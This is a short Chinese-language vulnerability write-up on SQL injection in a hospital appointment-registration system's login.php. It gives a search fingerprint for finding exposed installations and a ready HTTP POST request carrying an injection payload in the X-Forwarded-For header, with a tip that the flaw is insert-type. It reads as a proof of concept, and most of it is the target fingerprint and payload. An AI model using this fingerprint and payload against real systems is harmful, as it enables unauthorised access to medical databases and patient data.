# 挂号系统login.php存在SQL注入漏洞

# 一、漏洞简介
挂号系统存在SQL注入，可能导致数据库信息泄露、恶意数据库操作

# 二、资产测绘
```plain
body="res/img/ht_box_back.gif" || body="/res/img/ht_box_top.gif" || body="/res/img/ht_box_bottom.gif" || body="dom_loaded.load(init);"
```

![1715188160121-e62854f9-b160-425b-821a-fd1b5485ce71.png](./img/F-XmhV62ILsZoyLF/1715188160121-e62854f9-b160-425b-821a-fd1b5485ce71-639679.png)

## 三、漏洞复现
```http
POST /m/login.php?op=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: application/x-www-form-urlencoded
x-forwarded-for: 127.0.0.1 'and exists(select * from mysql)-- 123

username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
```

![1715224720711-eda57077-d9d0-466c-92d0-c91de443dbc9.png](./img/F-XmhV62ILsZoyLF/1715224720711-eda57077-d9d0-466c-92d0-c91de443dbc9-087014.png)

**<font style="color:#DF2A3F;">注入为insert类型，请勿使用sqlmap</font>**



> 更新: 2024-05-09 11:20:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yfrf96eoc8tgqfau>